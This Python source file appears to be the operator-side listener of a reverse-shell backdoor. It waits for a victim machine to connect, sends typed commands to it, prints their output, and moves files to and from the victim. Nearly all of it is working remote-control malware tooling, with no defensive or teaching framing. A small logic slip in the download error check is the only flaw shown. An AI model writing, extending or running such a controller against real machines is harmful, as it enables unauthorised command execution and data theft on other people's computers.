import socket, simplejson, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("\n[+] Waiting for incomming Connections...")
        self.connection, address = listener.accept()
        print("\n[+] Got a Connection " + str(address))
    
    def reliable_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        json_data = b" "
        while True:
            try: 
                json_data = json_data + self.connection.recv(24000)
                return simplejson.loads(json_data)    
            except ValueError: 
                continue
   
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()       
    
    def run(self):
        while True:
            connect = input(">>> ")
            connect = connect.split()
			
             
            try:
                if connect[0] == "upload":
                    file_content = self.read_file(connect[1])
                    connect.append(file_content)

                output = self.execute_remotely(connect)

                if connect[0] == "download" and "[-] Error!!!" not in connect:
                    output = self.write_file(connect[1], output)    
            except Exception:
                output = "[-] Error in Command Execution... Try AGAIN!!" 
            print(output)
